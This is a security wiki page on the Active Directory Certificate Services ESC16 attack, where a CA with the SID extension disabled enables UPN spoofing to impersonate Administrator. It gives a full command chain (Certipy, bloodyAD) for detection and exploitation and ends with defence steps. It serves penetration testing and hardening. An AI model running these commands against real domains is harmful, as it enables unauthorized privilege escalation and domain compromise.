---
title: AD CS ESC16 — szOID_NTDS_CA_SECURITY_EXT disabled
slug: adcs-esc16-securityext-disabled
---

> **TL;DR:** A CA configured to omit the SID security extension breaks strong cert-to-account binding — classic UPN-spoof PKINIT impersonation works again even with StrongCertificateBindingEnforcement turned on.

## What it is
KB5014754 introduced extension OID `1.3.6.1.4.1.311.25.2` (szOID_NTDS_CA_SECURITY_EXT) that pins the subject's SID inside the issued certificate. Strong-enforcement KDCs use that SID first when mapping a cert to an account; if it is present and mismatches the requested UPN, auth fails. ESC16 abuses CAs where this extension has been disabled — either via the `DisableExtensionList` registry value or `msPKI-Enrollment-Flag` `CT_FLAG_NO_SECURITY_EXTENSION`. With no SID inside the cert, the KDC falls back to UPN matching, and classic ESC9-style UPN spoofing comes back.

## Preconditions / where it applies
- Enterprise CA with the SID extension disabled, registry path: `HKLM\System\CurrentControlSet\Services\CertSvc\Configuration\<CA>\DisableExtensionList` containing `1.3.6.1.4.1.311.25.2`.
- Enroll right on a client-auth template that supplies subject via request (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` or `SubjectAltRequireUpn` off).
- Write or ForceChangePassword rights on a low-priv "patsy" account so you can set its UPN.
- KDC patched but enforcement mode permissive enough to let UPN fallback happen.

## Technique
Detect first — Certipy flags vulnerable CAs:

```bash
certipy find -u me@corp -p 'pw' -dc-ip 10.0.0.1 -vulnerable -stdout | grep ESC16
```

Exploit path (same shape as ESC9):

1. Change the patsy's `userPrincipalName` to the victim's `sAMAccountName` without the `@domain` suffix, e.g. `administrator`. Keep this short form — that's what mismatches the real Administrator's UPN-suffixed value.

```bash
bloodyAD -d corp -u me -p 'pw' --host dc set object patsy userPrincipalName administrator
```

2. Authenticate as patsy and request a cert from the ESC16 template; Certipy notices the missing extension.

```bash
certipy req -u patsy@corp -p 'pw' -ca corp-CA -template VulnTemplate
```

3. Revert the UPN so AD doesn't reject other writes.

```bash
bloodyAD -d corp -u me -p 'pw' --host dc set object patsy userPrincipalName patsy@corp
```

4. PKINIT with the cert. The KDC reads no SID extension, looks up by UPN, finds Administrator, hands out a TGT for it.

```bash
certipy auth -pfx patsy.pfx -domain corp -dc-ip 10.0.0.1
```

Same primitive applies to any privileged target whose UPN you can spoof through a patsy.

## Detection and defence
- Hunt `DisableExtensionList` set across all CAs — it should be empty.
- Audit cert template flag `CT_FLAG_NO_SECURITY_EXTENSION` (0x80000) on `msPKI-Enrollment-Flag`.
- Set `StrongCertificateBindingEnforcement = 2` (Full) on every DC; track event IDs 39, 41 for mapping failures.
- Watch 4738 / 4662 for rapid UPN flips on user objects — classic patsy pattern.
- Cross-reference with [[adcs-esc14-altsecidentities]] and [[adcs-attacks]] for the broader landscape.

## References
- [Certipy wiki — privilege escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) — ESC9/ESC16 automation
- [Microsoft KB5014754](https://support.microsoft.com/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16) — extension behaviour
- [SpecterOps — Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) — original AD CS abuse paper
- [HackTricks — AD CS](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/index.html) — ESC catalogue
